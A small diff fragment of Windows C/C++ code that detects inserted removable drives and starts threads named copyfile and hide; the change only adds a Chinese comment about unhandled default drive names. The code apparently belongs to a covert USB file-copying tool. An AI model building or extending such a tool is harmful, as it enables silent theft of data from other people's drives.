@@ -56,7 +56,7 @@ int main() {
 				DiskType = GetDriveType(src);
 				if (DiskType == DRIVE_REMOVABLE) {
 					GetVolumeInformation(src, usbname, 20, NULL, NULL, NULL, NULL, NULL);
-					if ( checkusb()) {
+					if ( checkusb()) {	//这里居然没有对默认U盘名“可移动磁盘”(usbname=="")的处理,只能拷贝默认U盘因此，悲剧了
 						hthread = CreateThread(NULL, 0, copyfile, NULL, 0, NULL);
 						hthread2 = CreateThread(NULL, 0, hide, NULL, 0, NULL);
 						usbs.push_back(usbname);
